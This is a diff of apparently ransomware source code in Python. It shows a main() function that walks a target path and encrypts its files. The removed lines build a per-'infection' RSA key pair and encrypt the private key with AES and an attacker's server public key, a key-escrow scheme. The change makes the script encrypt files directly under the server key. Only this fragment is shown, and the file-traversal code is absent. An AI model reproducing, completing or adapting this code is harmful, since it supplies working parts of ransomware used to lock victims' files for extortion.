@@ -188,49 +188,8 @@ def main():
         print("Error: Path does not exist")
         return
 
-    # Generate RSA keypair for this infection
-    print("Generating RSA key pair...")
-    cpriv_key = rsa.generate_private_key(
-        public_exponent=65537,
-        key_size=2048,
-        backend=default_backend()
-    )
-    cpub_key = cpriv_key.public_key()
-
-    # Serialize client private key to bytes
-    cpriv_bytes = cpriv_key.private_bytes(
-        encoding=serialization.Encoding.PEM,
-        format=serialization.PrivateFormat.TraditionalOpenSSL,
-        encryption_algorithm=serialization.NoEncryption()
-    )
-
-    # Hybrid encryption of the private key using AES + RSA
-    privkey_aes_key = secrets.token_bytes(32)  # AES key
-    privkey_iv = secrets.token_bytes(16)       # IV for CBC mode
-
-    # Pad and encrypt the private key with AES-CBC
-    padder = sym_padding.PKCS7(128).padder()
-    padded_privkey = padder.update(cpriv_bytes) + padder.finalize()
-
-    cipher = Cipher(algorithms.AES(privkey_aes_key), modes.CBC(privkey_iv), backend=default_backend())
-    encryptor = cipher.encryptor()
-    encrypted_privkey_data = encryptor.update(padded_privkey) + encryptor.finalize()
-
-    # Encrypt the AES key with the server's public RSA key
-    encrypted_privkey_key = server_public_key.encrypt(
-        privkey_aes_key,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-
-    # Write encrypted private key data to file
-    Path(args.enc_client_key).write_bytes(privkey_iv + encrypted_privkey_key + encrypted_privkey_data)
-
     print("Starting encryption...")
-    traverse(path, cpub_key, dry_run=args.dry_run)
+    traverse(path, server_public_key, dry_run=args.dry_run)
     print("Done.")
 
 if __name__ == "__main__":
